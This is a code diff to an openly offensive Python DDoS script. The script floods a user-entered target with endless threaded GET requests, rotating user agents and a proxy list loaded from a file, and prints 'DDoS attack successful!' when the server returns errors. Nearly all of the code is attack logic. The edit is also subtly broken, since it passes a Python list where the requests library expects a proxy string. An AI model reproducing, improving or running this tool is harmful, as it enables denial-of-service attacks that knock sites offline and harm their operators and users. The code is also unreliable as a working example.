@@ -6,6 +6,7 @@ import threading
 import os
 
 headers_useragents = []
+proxylist = []
 R = '\033[31m' #Aggressive/Alert/Caution/Warning/Failed
 B = '\033[34m' #Normal/Questioning/
 G = '\033[1;32m' #Process Completed/Success/
@@ -19,6 +20,13 @@ def dict_headers():
             headers_useragents.append(useragent)
 
 dict_headers()
+
+def dict_proxyfile():
+    global proxylist
+    with open(proxyfile, "r") as p:
+        proxs = p.read().splitlines()
+        for proxy in proxs:
+            proxylist.append(proxy)
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -70,7 +78,7 @@ def attack(target, proxyfile):
         while True:
             r += 1
             headers = {'user-agent': random.choice(headers_useragents).strip()}
-            proxies = {'http': proxyfile,'https': proxyfile}
+            proxies = {'http': proxylist,'https': proxylist}
             req = requests.get(target, headers=headers, proxies=proxies, verify=False)
             if req.status_code >= 500:
                 print(f"{G}[+] Target Website is down! DDoS attack successful!")
@@ -81,7 +89,7 @@ def attack(target, proxyfile):
                         while True:
                             r += 1
                             headers = {'user-agent': random.choice(headers_useragents)}
-                            proxies = {'http': proxyfile,'https': proxyfile}
+                            proxies = {'http': proxylist,'https': proxylist}
                             req = requests.get(target, headers=headers, proxies=proxies, verify=False)
                             if req.status_code >= 500:
                                 print(f"{G}[+] Target Website is down! DDoS attack successful!")
@@ -147,9 +155,10 @@ def main(target, proxyfile):
 
 if __name__ == "__main__":
     target = input(f"{B}Enter the target: ")
-    num_threads = int(input(f"{B}Amount of threads(1-1000): "))
+    num_threads = int(input(f"{B}Amount of threads to use: "))
     proxyfile = input(f"{B}Enter the proxy file: ")
     if os.path.isfile(proxyfile):
+        dict_proxyfile()
         print(f"{G}[+]Success! proxy file is found!")
         main(target, proxyfile)
     else:
